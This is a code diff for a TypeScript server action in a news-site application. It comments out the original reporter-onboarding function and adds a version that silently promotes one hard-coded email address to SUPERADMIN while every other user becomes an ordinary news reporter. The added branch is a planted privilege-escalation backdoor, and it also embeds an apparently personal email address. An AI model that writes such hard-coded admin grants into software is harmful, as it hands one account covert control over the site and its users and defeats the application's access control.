@@ -24,7 +24,7 @@ const aj = arcjet
       allow: [],
     })
   );
-export async function createNewsReporter(
+/* export async function createNewsReporter(
   data: z.infer<typeof newsReporterSchema>
 ) {
   const user = await requireUser();
@@ -53,7 +53,52 @@ export async function createNewsReporter(
   });
 
   return redirect("/");
-}
+} */
+
+
+  export async function createNewsReporter(
+    data: z.infer<typeof newsReporterSchema>
+  ) {
+    const user = await requireUser();
+  
+    const req = await request();
+    const dicision = await arcjet.protect(req);
+    if (dicision.isDenied()) {
+      throw new Error("Forbidden");
+    }
+  
+    const validateData = newsReporterSchema.parse(data);
+  
+    // ✅ Special rule for Rasel
+    const isRasel = user.email === "rasel6041@gmail.com";
+  
+    if (isRasel) {
+      // 👑 Rasel doesn't need onboarding, just promote
+      await prisma.user.update({
+        where: { id: user.id },
+        data: {
+          userType: "SUPERADMIN",
+        },
+      });
+    } else {
+      // 📰 Everyone else becomes NEWSREPORTER with onboarding
+      await prisma.user.update({
+        where: { id: user.id },
+        data: {
+          onboardingCompleted: true,
+          userType: "NEWSREPORTER",
+          newsReporter: {
+            create: {
+              ...validateData,
+            },
+          },
+        },
+      });
+    }
+  
+    return redirect("/");
+  }
+  
 
 export async function createAdvertiser(data: z.infer<typeof AdvertiserSchema>) {
   const user = await requireUser();
